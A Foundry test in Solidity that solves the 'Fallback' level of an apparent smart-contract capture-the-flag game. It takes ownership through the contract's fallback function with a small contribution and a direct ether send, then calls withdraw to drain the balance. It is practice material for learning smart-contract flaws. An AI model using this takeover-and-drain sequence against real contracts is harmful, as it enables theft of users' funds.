pragma solidity ^0.8.0;

import 'forge-std/Test.sol';
import 'levels/FallbackFactory.sol';
import 'levels/Fallback.sol';
import 'utils/TestUtils.sol';

contract FallbackTest is Test {
  address player;
  Utils utils;
  FallbackFactory fallbackFactory;
  address payable fallbackContractAddress;
  Fallback fallbackContract;

  function setUp() public {
    utils = new Utils();
    player = utils.createUsers(1)[0];
    fallbackFactory = new FallbackFactory();
    fallbackContractAddress = payable(fallbackFactory.createInstance(player));
    fallbackContract = Fallback(fallbackContractAddress);
  }

  function testHack() public {
    vm.prank(player);
    fallbackContract.contribute{value: 0.0001 ether}();

    vm.prank(player);
    (bool sent,) = fallbackContractAddress.call{value: 1}('');
    assert(sent);

    vm.prank(player);
    fallbackContract.withdraw();

    assertTrue(
      fallbackFactory.validateInstance(fallbackContractAddress, player), 'Level not solved'
    );
  }
}
